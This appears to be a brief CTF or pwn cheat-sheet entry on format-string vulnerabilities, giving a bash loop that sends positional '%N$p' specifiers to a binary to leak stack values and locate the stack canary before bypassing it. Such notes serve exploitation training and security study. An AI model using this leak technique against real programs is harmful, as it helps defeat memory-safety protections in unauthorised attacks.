# format string

# PWN - Format Strings

## bypass canary using format-string

get place of the canary

```bash
for x in $(seq 10 25); do echo $x >&2; echo "%$x\$p" | ./binary ;done | grep current
```